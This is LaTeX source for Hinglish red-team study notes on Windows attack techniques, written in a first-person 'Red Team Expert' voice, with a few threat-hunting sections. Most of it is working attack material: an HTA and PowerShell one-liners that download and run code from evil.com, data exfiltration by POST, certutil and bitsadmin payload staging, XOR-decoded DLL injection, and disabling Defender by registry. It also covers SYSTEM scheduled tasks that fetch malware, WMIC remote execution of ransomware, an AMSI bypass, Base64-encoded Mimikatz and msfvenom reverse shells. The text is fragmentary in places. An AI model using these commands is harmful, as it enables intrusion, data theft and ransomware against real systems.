...
\end{verbatim}
    \end{tcolorbox}
  \item Add Payload (Attacker - When: Staging): \begin{verbatim}
...
\end{verbatim}
  ...
  \item Malicious Code Example (Real Harm Kaise Karta Hai): Yeh advanced HTA jo reverse shell create karta hai (attacker ko remote access deta hai). Structure mein script tag mein code:
    \begin{tcolorbox}[colback=codebg, boxrule=0.5pt, arc=4pt, boxsep=5pt]
      \noindent\texttt{<html>}\\
      \texttt{<hta:application id="MalHTA" showintaskbar="no" windowstate="minimize">  ' Hidden window for stealth}\\
      \texttt{<script language="JavaScript">}\\
      \texttt{var shell = new ActiveXObject("WScript.Shell");}\\
      \texttt{shell.Run("powershell.exe -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://evil.com/shell.ps1')");  // Download aur run malicious PS script}\\
      \texttt{</script>}\\
      \texttt{</html>}
    \end{tcolorbox}
...
\end{verbatim}
  ...
  \item \textbf{Note:}\color{notered} Note: \color{black} Defenses Bypassed:
    ...
    \end{enumerate}
  \item Initial Access (Attacker - When: Phishing): Email se link bhejo jo runs\\
    \noindent\texttt{mshta http://evil.com/mal.hta}(how: HTA load with VBS for shell, harm: Reverse shell open, data steal start). Why: Stealthy entry.
    \begin{tcolorbox}[colback=codebg, boxrule=0.5pt, arc=4pt, boxsep=5pt]
\begin{verbatim}
...
\begin{enumerate}[leftmargin=*,itemsep=0.5em]
  ...
  \item Commands Breakdown (Tune jo diye, unko full explain with what happens):
    \begin{enumerate}
      \item \noindent\texttt{REG add "HKLM\textbackslash SOFTWARE\textbackslash POLICIES\textbackslash microsoft\textbackslash windows defender\textbackslash Real-Time protection /v DisabledRealtimeMonitoring /t REG\_DWORD /d 1 /f"}\\
        Yeh registry mein ek key add karta hai jo Windows Defender ke real-time monitoring ko disable karta hai.\\
        Breakdown: HKLM (system hive), path (Defender policy), /v (value name), /t (type: DWORD number), /d 1 (value: 1 for disable), /f (force without prompt).\\
        What happens? Defender real-time scan band ho jata hai, toh malware freely run kar sakta hai without AV trigger.\\
...
REG add "HKLM\SOFTWARE\POLICIES\microsoft\windows defender\Real-Time protection /v DisabledRealtimeMonitoring /t REG\_DWORD /d 1 /f"
\end{Verbatim}
    ...
    \begin{enumerate}
      ...
      \item Small Malicious Code Example 1 (VBS for Simple Download – Beginner Clear): Yeh code ek malware file download karta hai internet se aur run karta hai. Script file banao (save as mal.vbs):
        \begin{tcolorbox}[colback=codebg, boxrule=0.5pt, arc=4pt, boxsep=5pt]
          ...
          \usepackage{fancyvrb}  % Better control over verbatim
          \usepackage{setspace}
...
\end{Verbatim}
      ...
      \item Small Malicious Code Example 2 (JS for Keylogger – Beginner Clear): Yeh simple JS code keys log karta hai aur attacker ko bhejta hai. Save as keylog.js:
        \begin{tcolorbox}[colback=codebg, boxrule=0.5pt, arc=4pt, boxsep=5pt]
  \begin{lstlisting}[language=JavaScript, caption=Keylogger Script]
...
\begin{enumerate}[label=\arabic*.]
  ...
  \item Abuse Way 1: Execute Malicious Code (Example):  
  Harm: Backdoor install, organization ko control loss.
  \begin{tcolorbox}[title=Remote Execution, colback=gray!5, boxrule=0.5pt, arc=4pt]
  \texttt{IEX (New-Object Net.WebClient).DownloadString('http://evil.com/code.ps1')}
  \end{tcolorbox}

  \item Abuse Way 2: Steal Data (Example):  
  Harm: Sensitive info leak, financial damage.
  \begin{tcolorbox}[title=Data Exfiltration, colback=gray!5, boxrule=0.5pt, arc=4pt]
  \texttt{Get-Process | Out-File data.txt; Invoke-WebRequest -Uri 'http://evil.com' -Method POST -Body (Get-Content data.txt)}
  \end{tcolorbox}

  \item Abuse Way 3: Install Malware (Example):  
  Harm: Ransomware, operations disrupt.
  \begin{tcolorbox}[title=Malware Installation, colback=gray!5, boxrule=0.5pt, arc=4pt]
  ...
  \item How Red Teamers Use It (Step-by-Step with Examples – My Perspective): As a Red Team Expert, main WMIC ko ops mein use karta hoon for remote recon/execution. Yeh step-by-step hai, with how I do it.
    \begin{enumerate}
      \item Recon (Red Teamer Step): Target IP se services check (tune diya command) – example: \texttt{wmic /node:"192.168.1.100" /user:"admin" /password:"pass" service where caption like "\%sql server\%"} – Harm: Vulnerable services find, attack plan (organization ko DB breach).
        \begin{tcolorbox}[colback=codebg, boxrule=0.5pt, arc=4pt, boxsep=5pt]
   \cmd{wmic /node:"192.168.1.100" /user:"admin" /password:"pass" service where caption like "\%sql server\%"}
        \end{tcolorbox}
...
\end{verbatim}
  ...
  \item \textbf{Note:}\color{notered} Note: \color{black} Attack Flow Using LOLBins: Step-by-Step Malicious Example (Red Teamer Perspective): As a Red Team Expert, main ek full attack simulate karta hoon jahaan phishing se start hokar compromise, exfil, aur destruction tak jata hai. Yeh tune diye steps pe based hai (e.g., phishing email, weaponized PPT, wscript, powershell, download jpeg, XOR to DLL, rundll32, inject to explorer), but main sab LOLBins include karunga with small examples. Har step mein explain karunga: what/why/when/how, with command/code snippets taaki beginner ko clear ho (e.g., kaise script likhte hain, kya harm hota hai). Flow: Phishing -> Initial Execution -> Payload Staging -> Evasion -> Exfil -> Destruction.
    ...
    \end{verbatim}
      ...
      ('http://evil.com/payload.ps1')"}. What happens? Remote script download/run, harm: Malware install (e.g., keylogger). My view: Bypass AMSI for fileless attacks.
        \begin{tcolorbox}[colback=codebg, boxrule=0.5pt, arc=4pt, boxsep=5pt]
   \parbox{\linewidth}{\ttfamily
powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')"
      ...
      \item Download dscoo2.jpeg from https:// (Payload Fetch – When: PowerShell Se, Why: Staging): PowerShell certutil.exe ya bitsadmin.exe use karta hai download ke liye. How (example): \texttt{certutil.exe -urlcache -f https://evil.com/dscoo2.jpeg C:\textbackslash Temp\textbackslash file.jpg} (or \texttt{bitsadmin /create job /addfile job https://evil.com/dscoo2.jpeg C:\textbackslash Temp\textbackslash file.jpg /resume job}). What happens? File download (disguised as image), harm: Payload ready. My view: Certutil for stealthy fetch.
        \begin{tcolorbox}[colback=codebg, boxrule=0.5pt, arc=4pt, boxsep=5pt]
   \texttt{certutil.exe -urlcache -f https://evil.com/dscoo2.jpeg C:\textbackslash{}Temp\textbackslash{}file.jpg; bitsadmin /create job /addfile job https://evil.com/dscoo2.jpeg C:\textbackslash{}Temp\textbackslash{}file.jpg /resume job}
        \end{tcolorbox}
      \item XOR the Downloaded File and Write the Final DLL to C:\textbackslash ProgramData\textbackslash imapi2.dll (Obfuscation – When: Download Ke Baad, Why: Hide Payload): PowerShell XOR decrypt karta hai (simple obfuscation). How (small code example): \texttt{\$data = [System.IO.File]::ReadAllBytes('C:\textbackslash Temp\textbackslash file.jpg'); for(\$i=0; \$i -lt \$data.Length; \$i++){ \$data[\$i] = \$data[\$i] -bxor 0x5A }; [System.IO.File]::
      \\
      WriteAllBytes('C:\textbackslash ProgramData\textbackslash imapi2.dll', \$data)}. What happens? Encrypted file DLL ban jata hai, harm: Ready for injection. My view: XOR for AV evasion.
        \begin{tcolorbox}[colback=codebg, boxrule=0.5pt, arc=4pt, boxsep=5pt]
    \begin{verbatim}
    ...
    \end{verbatim}
      ...
      \item Inject the Downloaded DLL to explorer.exe (Persistence/Injection – When: Final Stage, Why: Hide in Legit Process): DLL code conhost.exe ya reg.exe use karta hai injection ke liye (e.g., \texttt{reg add} for run key, ya advanced DLL injection via PowerShell). How (example): PowerShell se \texttt{Invoke-DLLInjection -ProcessID (Get-Process explorer).Id -DLLPath 'C:\textbackslash Temp\textbackslash inject.dll'}. What happens? Code explorer.exe mein inject, harm: Persistent access (e.g., data exfil). My view: Explorer for blending.
        \begin{tcolorbox}[colback=codebg, boxrule=0.5pt, arc=4pt, boxsep=5pt]
   \texttt{Invoke-DLLInjection -ProcessID (Get-Process explorer).Id -DLLPath 'C:\textbackslash{}Temp\textbackslash{}inject.dll'}
        \end{tcolorbox}
    \end{enumerate}
...
\end{verbatim}
 ...
 \item \textbf{Note:} \textcolor{red}{Note:} \textcolor{black}{What It Contains and How APIs Look (Basic se Explain):} APIs functions ka collection hote hain – each API ek specific task karta hai (e.g., CreateFile API file open). Structure: Header files (e.g., \texttt{windows.h}) mein declarations, DLLs mein implementation. Kaisa dikhta hai? Code mein call jaise \texttt{MessageBox(NULL, "Hello", "Title", MB\_OK")} – yeh popup show karta hai. Windows APIs categories mein divide: Base (\texttt{kernel32.dll} for processes), User (\texttt{user32.dll} for UI), GDI (graphics), etc.
    \begin{tcolorbox}[colback=codebg, boxrule=0.5pt, arc=4pt, boxsep=5pt]
\begin{verbatim}
...
\end{verbatim}
 ...
 \item \textbf{Note:} \textcolor{red}{Note:} \textcolor{black}{How Red Teamers Use APIs for Malicious Purposes (My Expert Perspective with Examples):} As a Red Team Expert, main APIs ko target karta hoon for advanced attacks like hooking (behavior change) ya calling for malicious tasks.

Example 1 (Basic): \texttt{CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD\_START\_ROUTINE)LoadLibraryA, pDllPath, 0, NULL)} – harm: Code injection for backdoor.

Example 2 (Advanced Hooking): \texttt{SetWindowsHookEx} API se keyboard hook (capture keys) – harm: Keylogging (data theft).
...
\begin{itemize}
  \item \textbf{a. Shodan (What, When, Why, How)} 

  \textbf{What It Is (Yeh Kya Hai)}: Shodan ek search engine hai jo internet-connected devices (jaise servers, IoT, routers) ko scan karta hai aur unke metadata (ports, services, vulnerabilities) provide karta hai. Yeh "Internet of Things search engine" ke naam se famous hai, 2013 mein John Matherly ne banaya tha.

  \textbf{When to Use (Kab)}: Recon phase mein jab tu exposed devices find karna chahta hai (e.g., pre-phishing).

  \textbf{Why to Use (Kyun, Aur Nahi Kiya Toh Kya)}: Vast database deta hai vulnerable targets ka (e.g., open ports). Red teamer ke liye important kyunki yeh weak entry points show karta hai. Agar nahi use kiya, recon manual aur slow ho jata hai (missed opportunities).\\
  Pros: Real-time scans, filters (e.g., \texttt{country:IN}).\\
  Cons: Paid for full access, public hone se ethical issues.

  \textbf{How to Use (Step-by-Step for Beginners)}:
  \begin{enumerate}
    \item Shodan.io pe sign up (free account se start).
    \item Search query likho (e.g., \texttt{"port:80 country:IN"} for Indian web servers).
    \item Results dekho (IPs, banners).
    \item Advanced: API use for scripts (e.g., \texttt{shodan search --fields ip\_str,port "apache"}).
  \end{enumerate}

  \textbf{Red Teamer Usage with Real Example (My Perspective)}: As a Red Team Expert, main Shodan ko use karta hoon targets ke exposed services find karne ke liye taaki phishing ya exploits plan kar sakein.\\
  Real example: Ek op mein, main \texttt{"port:3389 country:IN"} search kiya RDP servers ke liye – ek vulnerable server mila jahaan weak password tha, usko exploit karke access gain kiya.\\
...
port:3389 country:IN
    \end{verbatim}
          \end{tcolorbox}
    \item \textbf{b. AbuseIPDB (What, When, Why, How)}

\textbf{What It Is (Yeh Kya Hai)}: AbuseIPDB ek free database hai jo malicious IPs report aur check karta hai (e.g., spam, hacking attempts). Yeh community-driven hai, 2015 mein start hua, aur IPs ke abuse history store karta hai.

\textbf{When to Use (Kab)}: Recon mein suspicious IPs validate karne ke liye, ya blue team mein alerts check.

\textbf{Why to Use (Kyun, Aur Nahi Kiya Toh Kya)}: IP reputation deta hai (e.g., hacking source hai ya nahi). Red teamer ke liye important kyunki yeh safe IPs find karne mein help karta hai for C2. Agar nahi use kiya, wrong IP se attack block ho jata hai.\\
Pros: Community reports, free API.\\
Cons: False positives possible.

\textbf{How to Use (Step-by-Step)}:
\begin{enumerate}
  \item AbuseIPDB.com pe jaao, IP search karo (e.g., \texttt{8.8.8.8}).
  \item Results dekho (abuse confidence score).
  \item Advanced: API key le kar script run karo: \parbox{\linewidth}{\ttfamily curl -G https://api.abuseipdb.com/api \\
  /v2/check --data-urlencode "ipAddress=8.8.8.8" -H "Key: YOUR\_API\_KEY"}
\end{enumerate}

\textbf{Red Teamer Usage with Real Example (My Perspective)}: Main AbuseIPDB ko use karta hoon apne C2 IPs check karne ke liye taaki clean lagen (nahi toh blocked ho jaayein).\\
...
Blue team side: Yeh alerts verify karne ke liye bhi use hota hai.
          \begin{tcolorbox}[colback=codebg, boxrule=0.5pt, arc=4pt, boxsep=5pt]
    \begin{verbatim}
curl -G https://api.abuseipdb.com/api/v2/check --data-urlencode "ipAddress=8.8.8.8" \\
-H "Key: YOUR_API_KEY"
    \end{verbatim}
          \end{tcolorbox}
  ...
  \begin{enumerate}[leftmargin=*,itemsep=0.5em]
    ...
    \item \textbf{Note:}\color{notered} Note: \color{black} Real Threat Hunter Example (Step-by-Step): Maan lo main red teamer hoon aur ek Windows machine compromise ki (via phishing). Ab persistence chahiye.
      \begin{enumerate}
       ...
       \item Advanced Hunt: Sigma rules se hunt karo for registry persistence, ya PowerShell se query:\\
\texttt{Get-ItemProperty -Path "HKU:\textbackslash{}*\textbackslash{}Software\textbackslash{}Microsoft\textbackslash{}Windows\textbackslash{}CurrentVersion\textbackslash{}Run"}
      \begin{tcolorbox}[colback=codebg, boxrule=0.5pt, arc=4pt, boxsep=5pt]
\begin{itemize}
  \item Registry persistence ke examples:

  \texttt{reg add HKU\textbackslash{}SOFTWARE\textbackslash{}Microsoft\textbackslash{}Windows\textbackslash{}CurrentVersion\textbackslash{}Run}\\
  \texttt{/v NotepadTest /t REG\_SZ /d "C:\textbackslash{}Windows\textbackslash{}System32\textbackslash{}notepad.exe"}\\
  \texttt{reg delete}\\
  \begin{itemize}
  \item Advanced Hunt: Sigma rules se hunt karo for registry persistence, ya PowerShell se query:

  \texttt{Get-ItemProperty -Path} \\
  \texttt{"HKU:\textbackslash{}*\textbackslash{}Software\textbackslash{}Microsoft\textbackslash{}Windows\textbackslash{}CurrentVersion\textbackslash{}Run"}
\end{itemize}
\end{itemize}
      \end{tcolorbox}
   \item \textbf{Note:} \textcolor{red}{Note:} \textcolor{black}{
HKEY\_USERS\textbackslash{}Software\textbackslash{}Microsoft\textbackslash{}Windows\textbackslash{}CurrentVersion\textbackslash{}RunOnce (and similar like RunServices, etc.)\\
(Corrected) Tune "HKEY\_users/software/microsoft/windows/x---x=run once, runservice..etc" likha -- yeh correct hai, x jaise RunOnce, RunServicesOnce, etc.\\
Yeh HKEY\_USERS ke under hain, similar to above but with twists.
}
      \begin{itemize}
      ...
      \end{itemize}
    \item \textbf{Note:}\color{notered} Note: \item \textbf{Note:} \textcolor{red}{Note:} \textcolor{black}{
Real Example with Notepad:\\
Command: \texttt{reg add HKU\textbackslash{}SOFTWARE\textbackslash{}Microsoft\textbackslash{}Windows\textbackslash{}CurrentVersion\textbackslash{}RunOnce}\\
\texttt{/v Test /d "notepad.exe"}\\
Reboot -- Notepad open hoga once, entry delete.\\
Real threat: Yeh ransomware deploy karne ke liye use hota hai.
}
      \begin{tcolorbox}[colback=codebg, boxrule=0.5pt, arc=4pt, boxsep=5pt]
\begin{itemize}
  \item Registry Persistence Example:

  \texttt{reg add HKU\textbackslash{}SOFTWARE\textbackslash{}Microsoft\textbackslash{}Windows\textbackslash{}CurrentVersion\textbackslash{}RunOnce} \\
  \texttt{/v Test /d "notepad.exe"}
\end{itemize}
      \end{tcolorbox}
...
\item \textbf{Note:} \textcolor{red}{Note:} \textcolor{black}{
\texttt{HKEY\_CURRENT\_USER\textbackslash{}Software\textbackslash{}Microsoft\textbackslash{}Windows}\\
\texttt{\textbackslash{}CurrentVersion\textbackslash{}Explorer\textbackslash{}User Shell Folders} (Corrected Path)\\
Tune \texttt{"HKEY\_current\_users/software/microsoft/windows/}\\
\texttt{currentverion/Explorer/user\_shell\_folder"}likha -- yeh mostly sahi hai,\\
lekin \textbf{CurrentVersion} spelling correct hai, aur yeh per-current-user hota hai.\\
Yeh startup folder ko indirectly control karta hai.
}
      \begin{itemize}
    ...
    \item \textbf{Note:}\color{notered} Note: \color{black} Threat Hunting Steps (Step-by-Step as Blue Teamer):
      ...
      \item Detection: Use PowerShell:\\
\texttt{Get-ItemProperty -Path "HKCU:\textbackslash{}Software\textbackslash{}Microsoft\textbackslash{}Windows\textbackslash{}CurrentVersion}\\
\texttt{\textbackslash{}Explorer\textbackslash{}User Shell Folders" | Select-Object Startup}.\\
Agar changed mile, alert.
      ...
      \begin{tcolorbox}[colback=codebg, boxrule=0.5pt, arc=4pt, boxsep=5pt]
\begin{itemize}
  \item Detection Commands:

  \texttt{Get-ItemProperty -Path "HKCU:\textbackslash{}Software\textbackslash{}Microsoft\textbackslash{}Windows\textbackslash{}}\\
  \texttt{CurrentVersion\textbackslash{}Explorer\textbackslash{}User Shell Folders" | Select-Object Startup}

  \texttt{wmic startup list full}
\end{itemize}
      \end{tcolorbox}
    ...
    \item \textbf{Note:}\color{notered} Note: \color{black} Kya Hai Startup Folder? (Basic Se Shuru) Startup Folder Windows ka built-in feature hai jahaan shortcuts (.lnk files) store hote hain, jo automatically run hote hain jab user sign-in karta hai. Yeh persistence ka simple way hai kyunki yeh OS ke normal behavior ko use karta hai -- no need for registry hacks ya services.
      \begin{itemize}
        \item What it is: Ek special folder jahaan tu shortcuts daal sakta hai executables ke (jaise .exe, scripts, ya apps). Jab Windows boot hota hai aur user logs in, OS is folder ko check karta hai aur sab shortcuts execute karta hai. Do main types:
          \begin{itemize}
          \item Per-User Startup Folder:\\
\texttt{C:\textbackslash{}Users\textbackslash{}<Username>\textbackslash{}AppData\textbackslash{}Roaming\textbackslash{}Microsoft}\\
\texttt{\textbackslash{}Windows\textbackslash{}Start Menu\textbackslash{}Programs\textbackslash{}Startup} (hidden by default, user-specific).
...
copy "C:\Windows\System32\notepad.exe" 
     ...
     Programs\Startup\NotepadTest.lnk"
...
\end{verbatim}
    ...
    \item \textbf{Note:}\color{notered} Note: \color{black} Real Threat Hunter Example (Step-by-Step for Blue Teamers) Maan lo ek red team attack hua, aur persistence via startup folder. As a threat hunter (blue team side), yeh steps follow karo to detect aur mitigate. Yeh real-world jaise APT attacks mein hota hai (e.g., groups jaise Lazarus startup folders use karte hain).
      \begin{enumerate}
        ...
        \item Basic Check: File Explorer mein jaao (show hidden files on), navigate to C:\textbackslash Users\textbackslash<User>\textbackslash AppData\textbackslash Roaming\textbackslash Microsoft\textbackslash Windows\textbackslash Start Menu\textbackslash Programs\ \\
        textbackslash Startup. Dekho suspicious .lnk files (e.g., unknown names ya paths).
        \item Via CMD/Tool: Command: \texttt{dir "C:\textbackslash Users\textbackslash\%USERNAME\%\textbackslash AppData\textbackslash Roaming\textbackslash \\
        Microsoft\textbackslash Windows\textbackslash Start Menu\textbackslash Programs\textbackslash Startup" /b} to list files. All users ke liye: \texttt{dir "C:\textbackslash \\
        ProgramData\textbackslash Microsoft\textbackslash Windows\textbackslash Start Menu\textbackslash Programs\textbackslash Startup" /b}.
          \begin{itemize}
          ...
          \end{itemize}
        \item Advanced Hunt: EDR tool jaise CrowdStrike ya Microsoft Defender use karo for file creation events (Event ID 11 in Sysmon). Query: Search for .lnk files created in startup paths. PowerShell se: \texttt{Get-ChildItem -Path "C:\textbackslash Users\textbackslash*\textbackslash AppData\textbackslash Roaming\textbackslash Microsoft\textbackslash Windows\textbackslash Start Menu\textbackslash Programs\ \\
        textbackslash Startup" -Recurse -Filter *.lnk | Select FullName, Target}.
        ...
        \item Mitigation: Delete the file: \texttt{del "C:\textbackslash Users\textbackslash\%USERNAME\%\textbackslash AppData\textbackslash Roaming\textbackslash \\
        Microsoft\textbackslash 
        Windows\textbackslash Start Menu\textbackslash Programs\textbackslash Startup\textbackslash suspicious.lnk"}. Prevent future: Group Policy se restrict folder access, ya monitor with scripts.
...
\end{verbatim}
    ...
    \item \textbf{Note:}\color{notered} Note: \color{black} WMI Lateral Movement: wmic /node:192.168.18.235 /user:ajay /password:pass process call create "c:\textbackslash path\textbackslash ransom.exe" Yeh remote machine par process create karta hai.
      \begin{itemize}
        ...
        \item Small Example: Command: \texttt{wmic /node:192.168.18.235 /user:ajay \\
        /password:pass process call create "c:\textbackslash path\textbackslash ransom.exe"}. Yeh remote IP par ransom.exe run karega. Red teamer isse use karega payload deploy karne, jaise reverse shell for further access.
    ...
    \item \textbf{Note:}\color{notered} Note: \color{black} WMI Persistence: Event Filter, Event Consumer, Binding (Explain Everything with Code) WMI persistence events se hoti hai -- filter (trigger) banao, consumer (action), aur binding (link) for auto-execution.
      \begin{itemize}
        ...
        \item Explain the Code (Small Example): PowerShell se create karo (as red teamer):
          \begin{enumerate}
            \item Filter: \texttt{\$filter = Set-WmiInstance -Class \_\_EventFilter -Arguments @{Name='MyFilter'; QueryLanguage='WQL'; Query="SELECT * FROM \_\_InstanceCreationEvent WITHIN 60 WHERE TargetInstance ISA \\
            'Win32\_Process' AND TargetInstance.Name='notepad.exe'"} } (Trigger jab Notepad start ho).
            ...
            \item Binding: \texttt{\$binding = Set-WmiInstance -Class \_\_FilterToConsumerBinding -Arguments @{Filter=\$filter; Consumer=\$consumer;
            \\
            DeliverSynchronously=\$true} } (Link karo, sync mode).
          \end{enumerate}
  ...
  \begin{enumerate}[leftmargin=*,itemsep=0.5em]
    \item \textbf{Note:}\color{notered} Note: \color{black} Kya Hai Task Scheduler? (Basic Se Shuru) Task Scheduler Windows ka built-in service hai jo automated tasks schedule karta hai – jaise programs run karna specific time ya events par. Yeh OS ke core part hai, admins use karte hain maintenance ke liye (jaise backups, updates).
      \begin{itemize}
        ...
        \item Where it resides (Kahan rahta hai): Service level par – "Task Scheduler" service (Taskschd.dll) C:\textbackslash Windows\textbackslash System32 mein, tasks store hote hain C:\textbackslash Windows\textbackslash System32\textbackslash Tasks folder mein (XML files) ya registry mein \\
        (HKEY\_LOCAL\_MACHINE\textbackslash SOFTWARE\textbackslash Microsoft\textbackslash Windows NT\textbackslash \\
        CurrentVersion\textbackslash Schedule). GUI se access karo via taskschd.msc.
    ...
    \item \textbf{Note:}\color{notered} Note: \color{black} schtasks /create /sc onlogon /tn "ajay" /tr "c:/windows/system32/notepad.exe"
      ...
      \end{codebox}
    \item \textbf{Note:}\color{notered} Note: \color{black} schtasks /create /tn "task name" /tr "c:/windows/syswow64/windowspowershell \\
    /v1.0/powershell.exe -windowstyle hidden -nologo -noninteractive -ep bypass -nop -c IEX (new-object net.webclient).downloadString('http://192.168.235/malware.ps1')" /sc onlogon /ru system
      \begin{itemize}
...
-WindowStyle Hidden -NoLogo -NonInteractive -ExecutionPolicy Bypass 
-NoProfile -c IEX (New-Object Net.WebClient).DownloadString(
'http://192.168.235/malware.ps1')" 
/sc onlogon /ru system
\end{codebox}
    \item \textbf{Note:}\color{notered} Note: \color{black} schtasks /create /sc minute /mo 1 /tn "task name" /tr "c:/windows/system32 \\
    /notepad.exe"
      \begin{itemize}
    ...
    \item \textbf{Note:}\color{notered} Note: \color{black} Real Threat Hunter Example (Step-by-Step for Blue Teamers) Maan lo red teamer ne malicious task set kiya. As threat hunter, yeh steps follow karo (real jaise APT attacks mein):
      \begin{enumerate}
       ...
       \begin{itemize}
  \item Advanced Hunt: Event Viewer mein check 
  (Event ID 4698 for creation, under 
  Microsoft-Windows-TaskScheduler/Operational).\\
  PowerShell: \texttt{Get-ScheduledTask | Where-Object \{\$_.State -eq 'Ready'\}}.\\
  EDR jaise Sysmon (Event ID 1 for process creation from tasks).

  \item Validation: Suspicious mile 
  (e.g., \texttt{/ru SYSTEM} with weird URL), 
  file hash VirusTotal par check.
\end{itemize}
    ...
    \item \textbf{Note:}\color{notered} Note: \color{black} Real Threat Hunter Example (Step-by-Step for Blue Teamers) Maan lo red teamer ne malicious service create kiya (jaise Blue Mockingbird attack mein, jo crypto-miner deploy karta hai via sc). As threat hunter, yeh steps follow karo:
      \begin{enumerate}
       ...
       \begin{itemize}
  \item Via Tool: \texttt{services.msc} open karo ya PowerShell:\\
  \texttt{Get-Service | Where-Object \{\$_.StartType -eq 'Automatic'\}} – anomalies check.

  \item Advanced Hunt: Event Viewer mein \textbf{Event ID 7045} 
  (new service creation) query karo.\\
  Sysmon logs: \textbf{Event ID 1} for process creation from \texttt{services.exe}.\\
  Tool: \texttt{Autoruns} se services tab check karo.
\end{itemize}
    ...
    \item \textbf{Note:}\color{notered} Note: \color{black} Practical Example in Python (Step-by-Step: Renaming Obfuscation) Red teamers Python mein obfuscation karte hain kyunki yeh scripting ke liye easy hai (e.g., payloads for phishing ya exploits). Yeh example benign hai (simple calculator), but real mein malicious twist bataunga (jaise reverse shell). Step-by-step jaayenge taaki doubts clear hon – code ko obfuscate kar ke AV bypass kaise hota hai.
      \begin{itemize}
        ...
        \item Step 2: Renaming Obfuscation Apply Karo (How to Do It) Renaming mein, meaningful names ko random/obscure se replace karo – jaise "add\_numbers" ko "xYzAbC123", variables ko "a1", "b2". Manual kar sakte ho, ya tool use (jaise pyminifier ya custom script). Yeh practical karne ke liye: Pehle pip install pyminifier (simple obfuscator). Phir code obfuscate karo. Manual way (simple for learning):
          \begin{itemize}
            \item Function name change: add\_numbers -> obfuscated\_func\_abc
            \item Variables change: num1 -> var\_x1, num2 -> var\_y2, result -> res\_z3
            \item Add dead code (extra obfuscation): Useless lines daalo jaise if False: print("dummy")
          \end{itemize}
  ...
  \item Steps:
  \begin{enumerate}
    \item Script ko Base64 encode karo:\\
    \texttt{[Convert]::ToBase64String([Text.Encoding]::Unicode.
    \\
    GetBytes('Invoke-Mimikatz'))}

    \item Decode aur run karo:\\
    \texttt{\$encoded = 'SQBuAHYAbwBrAGUALQBNAEkAbQBpAGsAYQB0AHoA'}\\
    \texttt{\& ([ScriptBlock]::Create([Text.Encoding]::Unicode.GetString(}\\
    \texttt{[Convert]::FromBase64String(\$encoded))))}
  \end{enumerate}
\end{itemize}
                ...
                \item Memory Patching (AMSI.dll Modify): AMSI function ko patch karo taaki scan fail ho (e.g., amsiInitFailed set karo).
                  \begin{itemize}
                    \item Steps: 1. PowerShell mein reflectively load: [Ref].Assembly.GetType('System \\
                    .Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic, \\
                    Static').SetValue(\$null,\$true). 2. Ab scripts run without scan.
          ...
          \begin{itemize}
            \item Step-by-Step: Developing Shellcode in Python (Red Teamer Way) Red teamers tools jaise NASM (for assembly) aur Python (for wrapping) use karte hain. Yeh example basic message box shellcode hai (benign test), but real mein reverse shell twist bataunga. Practice: Kali Linux VM mein karo.
              \begin{enumerate}
                ...
                \item Compile Assembly to Shellcode: NASM se object banao, phir objdump se extract.
                  \begin{itemize}
                    \item Command: nasm -f win32 shellcode.asm -o shellcode.o
                    \item Extract hex: objdump -d shellcode.o | grep "^ " | cut -f2 | tr -d ' ' | xxd -r -p > shellcode.bin
                    \item Hex string banao Python ke liye: xxd -i shellcode.bin > shellcode_hex.txt (yeh array deta hai).
                  \end{itemize}
        ...
        \item \textbf{Note:}\color{notered} Note: \color{black} How to Create Shellcode from Msfvenom in Kali Linux (Step-by-Step) Msfvenom (Metasploit tool) shellcode generate karta hai quickly, with payloads like reverse shells. Yeh red teamers ka favorite hai kyunki customizable aur encoded hota hai.
          \begin{enumerate}
            ...
            \begin{itemize}
  \item Payload Choose Karo: Example — 
  \texttt{windows/x64/meterpreter/reverse\_tcp} (reverse shell).

  \item Command Run Karo:\\
  \texttt{msfvenom -p windows/x64/meterpreter/reverse\_tcp}\\
  \texttt{LHOST=your\_kali\_ip LPORT=4444 -f python -o shellcode.py}\\
  (yeh Python format mein output deta hai).
\end{itemize}
              \begin{itemize}
                \item LHOST: Tumhara Kali IP (ifconfig se dekho).
                \item LPORT: Listener port.
                \item -f python: Hex array for Python.
              \end{itemize}
            \item Output Check Karo: shellcode.py mein array milega, jaise buf = b"\xfc\x48..." – isko loader mein paste karo.
            \item Listener Set Karo: msfconsole mein: use multi/handler; set payload windows/x64 \\
            /meterpreter/reverse\_tcp; set LHOST your\_ip; set LPORT 4444; exploit.
      ...
      \begin{enumerate}[itemsep=10pt]
        ...
        \item General Steps for Process Injection:
          \begin{itemize}
            ...
            \begin{itemize}
  \item Handle Obtain Karo: \texttt{OpenProcess} API se target ka handle lo\\
  (access rights: \texttt{PROCESS\_ALL\_ACCESS}).

  \item Memory Allocate Karo: \texttt{VirtualAllocEx} se target mein space banao\\
  (RWX permissions: \texttt{PAGE\_EXECUTE\_READWRITE}).
\end{itemize}
        ...
        \item What It Contains/Important Things to Read About: TCPView table format mein data show karta hai with columns jaise:
          \begin{itemize}
           ...
           \begin{itemize}
  \item State: Connection status\\
  (e.g., \texttt{ESTABLISHED} = connected, 
  \texttt{LISTENING} = waiting, 
  \texttt{TIME\_WAIT} = closing).

  \item Sent/Received Packets/Bytes:\\
  Kitna data bheja/gaya (useful for investigating data exfil).
\end{itemize}
        ...
        \item \textbf{\color{notered}Note:} Practical Example (Red Teamer Use Case): Maan lo tu initial access ke liye reverse shell establish kiya (jaise process injection se, pehle discuss kiya). Ab investigate karna hai ki connection sahi hai ya nahi.
          \begin{itemize}
            ...
            \begin{itemize}
  \item Step 3: Agar bytes zyada ho (e.g., data exfil), 
  ya state \texttt{TIME\_WAIT} ho (dropping), 
  toh troubleshoot karo – jaise port change ya firewall check.

  \item Step 4: Red team mein, yeh help karta hai agar shell unstable ho – 
  dekh sakte ho competing connections 
  (e.g., AV trying to phone home), unko close karo.\\
  Example: Agar remote port \texttt{4444} pe traffic ja raha hai 
  aur bytes increasing, confirm hota hai shell active hai.\textsuperscript{[4][1][3]}
\end{itemize}
          \end{itemize}
     ...
     \begin{itemize}
  \item \textcolor{red}{\textbf{Note:}} 
  \texttt{net stop <service\_name>} specified service ko stop karta hai.\\
  Yeh SCM ko request bhejta hai graceful stop ke liye.\\
  Agar service dependent hai, woh bhi stop ho sakta hai.\textsuperscript{[5][2]}
\end{itemize}
        ...
        \item Access Denied Ka Issue: Yeh hota hai kyunki:
          \begin{itemize}
            ...
            \begin{itemize}
  \item Why?: Windows services protected hote hain, 
  stop karne ke liye \texttt{SERVICE\_STOP} right chahiye.

